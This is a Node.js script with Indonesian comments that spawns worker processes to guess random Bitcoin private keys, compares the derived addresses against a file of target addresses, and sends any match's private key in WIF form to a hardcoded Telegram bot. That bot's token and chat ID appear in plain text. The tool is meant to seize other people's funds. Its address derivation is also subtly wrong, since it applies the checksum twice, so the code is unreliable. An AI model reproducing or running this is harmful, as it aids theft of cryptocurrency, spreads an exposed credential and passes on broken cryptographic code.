import crypto from 'crypto';
import bs58check from 'bs58check';
import elliptic from 'elliptic';
import fs from 'fs';
import fetch from 'node-fetch';
import cluster from 'cluster';
import { cpus } from 'os';
import blessed from 'blessed';

// Konfigurasi Telegram
const TELEGRAM_TOKEN = '6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE';
const TELEGRAM_CHAT_ID = '-4562112556';
// Inisialisasi Elliptic Curve (secp256k1)
const EC = elliptic.ec;
const ecCurve = new EC('secp256k1');

// Membaca daftar Bitcoin address dari file
let addresses = new Set();
const dataFilePath = process.argv[2] || 'data_address.txt'; // Menangani argumen CLI

try {
    const data = fs.readFileSync(dataFilePath, 'utf-8');
    data.split("\n").forEach((address) => {
        if (address.trim().startsWith('1')) {
            addresses.add(address.trim());
        }
    });
} catch (error) {
    console.error(`Error loading address data from ${dataFilePath}:`, error);
    process.exit(1);
}

// Fungsi untuk mengirim pesan ke Telegram
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    });

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body,
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('Error sending message to Telegram:', result);
        }
    } catch (error) {
        console.error('Failed to send message to Telegram:', error);
    }
}

// Mengonversi private key ke format WIF (Wallet Import Format)
function convertPrivateKeyToWIF(privateKeyHex) {
    const privateKeyBuffer = Buffer.from(privateKeyHex, 'hex');
    const version = 0x80; // Prefix untuk mainnet Bitcoin
    const keyWithPrefix = Buffer.concat([Buffer.from([version]), privateKeyBuffer]);
    const checksum = crypto.createHash('sha256').update(crypto.createHash('sha256').update(keyWithPrefix).digest()).digest().slice(0, 4);
    const keyWithChecksum = Buffer.concat([keyWithPrefix, checksum]);
    return bs58check.encode(keyWithChecksum);
}

// Mendapatkan Bitcoin address dari private key
function getBitcoinAddressFromPrivateKey(privateKey) {
    const keyPair = ecCurve.keyFromPrivate(privateKey, 'hex');
    const publicKey = keyPair.getPublic().encode('hex');
    const publicKeyBuffer = Buffer.from(publicKey, 'hex');
    const publicKeyHash = crypto.createHash('sha256').update(publicKeyBuffer).digest();
    const ripemd160Hash = crypto.createHash('ripemd160').update(publicKeyHash).digest();
    const addy = Buffer.alloc(21);
    addy.writeUInt8(0x00, 0); // Prefix untuk mainnet Bitcoin
    ripemd160Hash.copy(addy, 1);
    const checksum = crypto.createHash('sha256').update(crypto.createHash('sha256').update(addy).digest()).digest();
    const fullAddress = Buffer.concat([addy, checksum.slice(0, 4)]);
    return bs58check.encode(fullAddress);
}

// Fungsi utama untuk melakukan brute force private key secara acak
async function bruteForce() {
    let keysGenerated = 0;  // Track jumlah keys per worker
    const startTime = Date.now();  // Simpan waktu mulai

    while (true) {
        // Generate private key secara acak
        const privateKey = crypto.randomBytes(32).toString('hex');
        const bitcoinAddress = getBitcoinAddressFromPrivateKey(privateKey);

        // Jika address ditemukan dalam daftar
        if (addresses.has(bitcoinAddress)) {
            console.log(`\nMatch Found: ${bitcoinAddress}`);

            // Konversi private key ke WIF
            const privateKeyWIF = convertPrivateKeyToWIF(privateKey);
            const successMessage = `Wallet: ${bitcoinAddress}\nPrivate Key (WIF): ${privateKeyWIF}`;

            // Kirim ke Telegram
            await sendTelegramMessage(`Address found!\n${successMessage}`);

            // Simpan ke file
            // fs.writeFileSync('./found_addresses.txt', successMessage + "\n", { flag: 'a' });

            // Hentikan worker jika address ditemukan
            process.exit(0);
        }

        // Kirim jumlah private key yang sudah diuji ke proses utama
        keysGenerated++;
        process.send({ count: keysGenerated });

        // Update kecepatan setelah beberapa waktu
        const elapsedMinutes = (Date.now() - startTime) / 60000;
        const speed = keysGenerated / elapsedMinutes;
        process.send({ speed: speed });
    }
}

// Jika proses utama (master)
if (cluster.isMaster) {
    let numCPUs = cpus().length;
    numCPUs = 19;
    let screen = blessed.screen({ smartCSR: true });
    let boxes = [];
    let startTime = Date.now();
    let totalKeysGenerated = 0;

    // Kirim pesan ke Telegram bahwa proses sudah dimulai dengan jumlah address yang dimuat
    sendTelegramMessage(`Script berjalan dengan ${addresses.size} address.`);

    // Box untuk setiap worker
    for (let i = 0; i < numCPUs; i++) {
        let box = blessed.box({
            top: `${20 + i * 80 / numCPUs}%`,
            left: 0,
            width: '100%',
            height: `${80 / numCPUs}%`,
            content: `Worker ${i + 1} Keys generated: 0\nSpeed: 0 keys/min`,
            border: { type: 'line' },
            style: { fg: 'green', border: { fg: 'green' }, font: 'monospace' }
        });
        screen.append(box);
        screen.render(); // Render setelah setiap box ditambahkan
        boxes.push(box);
    }

    // Jalankan fork untuk setiap CPU
    for (let i = 0; i < numCPUs; i++) {
        let worker = cluster.fork();

        // Variabel untuk menyimpan jumlah keys yang dihasilkan per worker
        let keysGenerated = 0;
        let speed = 0;

        // Terima pesan dari worker untuk update jumlah keys yang dihasilkan
        worker.on('message', (message) => {
            if (message.count) {
                keysGenerated = message.count;
                totalKeysGenerated += 1;
            }
            if (message.speed) {
                speed = message.speed;
            }

            // Update box dengan data terbaru
            boxes[i].setContent(`Worker ${i + 1} Keys generated: ${keysGenerated}\nSpeed: ${speed.toFixed(2)} keys/min`);
            screen.render();
        });
    }

    // Handler jika worker keluar (exit)
    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} exited with code ${code} and signal ${signal}`);
    });
} else {
    // Jika ini adalah worker, jalankan brute force
    bruteForce();
}
